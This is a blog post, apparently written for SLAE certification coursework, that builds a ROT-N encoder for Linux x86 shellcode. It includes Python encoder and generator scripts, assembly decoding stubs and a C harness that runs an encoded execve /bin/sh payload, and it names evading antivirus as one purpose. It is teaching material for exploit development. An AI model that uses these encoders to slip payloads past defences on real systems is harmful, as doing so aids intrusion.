---
layout: post
title: "ROT-N Shellcode Encoder/Generator (Linux x86)"
date: 2017-05-03 12:00:00
share: true
comments: true
tags: [Exploit Development, Shellcoding, SLAE, OSCE Prep]
---

_This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)._
_**Student ID:** SLAE-885_
_**Assignment number:** 4_
_**Github repo:** <https://github.com/abatchy17/SLAE>_  

---
 
## What is shellcode encoding?

Encoding shellcode is common to avoid bad characters or trick lame AVs into believing your code isn't malicious. To execute the shellcode, you'll need a "decoding stub" appending the shellcode so it returns the shellcode back to its original form then allow it to execute. An easy way to encode your shellcode is using [MSF encoders](https://www.offensive-security.com/metasploit-unleashed/msfencode/) (link is outdated as msfencode and msfpayload have been replaced with msfvenom but syntax is pretty much the same.  
  
Assignment 4 of SLAE requires a custom encoder, can be pretty much anything. Being lazy, I decided to go for ROT-13 (or any number between 1-255 for the matter). 

This post will walk you through creating a (simple) custom encoder.  

---

## Pros and cons of a mediocre ROT-N encoder

#### Pros:

* Will most likely get rid of null characters.  
* Some AVs won't recognize it.  

#### Cons:

* Decoding stub will easily get picked by AVs.  
* Doesn't obfuscate the code.  
* Decoder needs to know the size of the shellcode, this can be done by using
a conditional jump for the operation done, or by explicitly defining the size
of the shellcode. Implementation details will discuss both approaches.  

---

## Implementation of ROT-13 encoder/decoder

  

### 1\. Generate encoded payload

We'll first create an encoder (simple python script) that will iterate over the payload (simple `execve("/bin//sh", NULL,NULL)`) and print it.  
 
```python
#!/bin/python  
  
shellcode = ("\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b\xcd\x80")  
  
magic = 13  
  
encoded1 = ""  
encoded2 = ""  
  
for i in bytearray(shellcode):  
 j = (i + magic)%256  
 encoded1 += '\\x'  
 encoded1 += '%02x' %j  
  
 encoded2 += '0x'  
 encoded2 += '%02x, ' %j  
  
print "Format 1: {0}".format(encoded1)  
print "Format 2: {0}".format(encoded2)  
```

```console
abatchy@ubuntu:~/Desktop/work$ python encoder.py   
Format 1: \x3e\xcd\x5d\x96\xef\x75\x3c\x3c\x80\x75\x75\x3c\x6f\x76\x7b\x96\xf0\x5d\xbd\x18\xda\x8d  
Format 2: 0x3e, 0xcd, 0x5d, 0x96, 0xef, 0x75, 0x3c, 0x3c, 0x80, 0x75, 0x75, 0x3c, 0x6f, 0x76, 0x7b, 0x96, 0xf0, 0x5d, 0xbd, 0x18, 0xda, 0x8d,  
```

As you can notice, bytes have been incremented by `13`, so `31` becomes `3e`, `c0` becomes `cd` and so on.  
  
---

### 2\. Write assembly wrapper including decoding stub


Next, we'll write an assembly wrapper to decode the shellcode and execute it. Notice that we don't have a way to know size of the shellcode, so we'll hard code its size for now, followed by a nice improvement to get rid of that.  

```nasm
; Rot13ExecveSh.asm  
; by Abatchy  
;  
;   nasm -felf32 Rot13Encoder.asm && ld -o Rot13Encoder Rot13Encoder.o  
; Generated shellcode:   
  
global _start  
  
section .text  
  
_start:  
      
    jmp short get_shellcode_addr    ; Get address of shellcode  
  
ReturnLabel:  
    pop esi                 ; Store address of "shellcode" in esi  
    xor eax, eax  
    mov al, 22  
decode:  
    sub byte [esi], 13      ; Decode byte at [esi]  
    dec al  
    jz shellcode              
    inc esi  
    jmp short decode  
  
get_shellcode_addr:  
    call ReturnLabel  
    shellcode: db  0x3e, 0xcd, 0x5d, 0x96, 0xef, 0x75, 0x3c, 0x3c, 0x80, 0x75, 0x75, 0x3c, 0x6f, 0x76, 0x7b, 0x96, 0xf0, 0x5d, 0xbd, 0x18, 0xda, 0x8d  
```

---

### 3\. Extract shellcode into C wrapper

Why do we need this? The shellcode is defined in the text segment, which means editing it will crash the program, so we need a C wrapper where the shellcode is decoded without causing issues.  

```cpp
/*  
 Rot13ExecveSh.c  
By Abatchy  
gcc Rot13ExecveSh.c -fno-stack-protector -z execstack -o Rot13ExecveSh.out  
*/  
  
#include <stdio.h>  
#include <string.h>  
  
unsigned char sc[] =   
"\xeb\x0f\x5e\x31\xc0\xb0\x16\x80"  
"\x2e\x0d\xfe\xc8\x74\x08\x46\xeb"  
"\xf6\xe8\xec\xff\xff\xff\x3e\xcd"  
"\x5d\x96\xef\x75\x3c\x3c\x80\x75"  
"\x75\x3c\x6f\x76\x7b\x96\xf0\x5d"  
"\xbd\x18\xda\x8d";  
  
int main()  
{  
    printf("Shellcode size: %d\n", strlen(sc));  
    int (*ret)() = (int(*)())sc;  
    ret();  
}  
```

Now compile and run!  
```console
abatchy@ubuntu:~/Desktop/work$ gcc Rot13ExecveSh.c -fno-stack-protector -z execstack -o Rot13ExecveSh.out  
abatchy@ubuntu:~/Desktop/work$ ./Rot13ExecveSh.out   
Shellcode size: 44  
$ exit  
```    

---

### 4\. Getting rid of hard-coded shellcode size

Hard coding the shellcod size in the decoding stub is ugly, and is better to get rid of it for robustness, how do we do that?  
  
Check the assembly code we used earler, it's already using the SUB instruction, which affects registers. What if we add an additional byte of value N (in this case it's 13), so when it's subtracted, followed by a JZ jmp instruction, we know that we reached the end of the shellcode?  

**Modified assembly wrapper**  

```nasm
; Rot13ExecveSh.asm  
; by Abatchy  
;  
;   nasm -felf32 Rot13Encoder.asm && ld -o Rot13Encoder Rot13Encoder.o  
; Generated shellcode:   
  
global _start  
  
section .text  
  
_start:  
      
    jmp short get_shellcode_addr    ; Get address of shellcode  
  
ReturnLabel:  
    pop esi                 ; Store address of "shellcode" in esi  
decode:  
    sub byte [esi], 13      ; Decode byte at [esi]  
    jz shellcode              
    inc esi  
    jmp short decode  
  
get_shellcode_addr:  
    call ReturnLabel  
    shellcode: db  0x3e, 0xcd, 0x5d, 0x96, 0xef, 0x75, 0x3c, 0x3c, 0x80, 0x75, 0x75, 0x3c, 0x6f, 0x76, 0x7b, 0x96, 0xf0, 0x5d, 0xbd, 0x18, 0xda, 0x8d, 0x0d
```    

---  

### 5\. Python wrapper to support ROT-N

Wrapper below basically dissects the shellcode to replace instances where N is used, and encodes the payload, also shows a warning message if shellcode generated contains any null bytes.  

```python
#!/bin/python  
  
import sys  
  
def parse_args():  
    if len(sys.argv) < 2:  
        print "Usage: {0} N, where N is the number of rotations to be made".format(sys.argv[0])  
        print "[+] Using default value of N = 13"  
        return 13  
    else:  
        x = int(sys.argv[1]) % 256  
        if x < 1:  
            print "[-] Invalid number of rotations"  
            exit()  
        return x  
  
magic = parse_args()  
rotated_execve = ""  
hasNulls = False  
          
print "[+] Generating ROT-{0} encoded payload".format(magic)  
  
execvesh = ("\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b\xcd\x80")  
  
  
for i in bytearray(execvesh):  
 j = (i + magic)%256  
        if j == 0:  
                hasNulls = True  
 rotated_execve += '\\x'  
 rotated_execve += '%02x' %j  
  
sc = "\\xeb\\x09\\x5e\\x80\\x2e" + ("\\x%02x"%magic) + "\\x74\\x08\\x46\\xeb\\xf8\\xe8\\xf2\\xff\\xff\\xff"   
sc += rotated_execve + ("\\x%02x"%magic)  
  
print "[+] Generated shellcode: " + sc  
  
if hasNulls:  
    print "[-] WARNING: Encoded payload contains at least one null byte, consider changing N"  
```

Feel free to give any feedback/suggestions.  
  
\- Abatchy

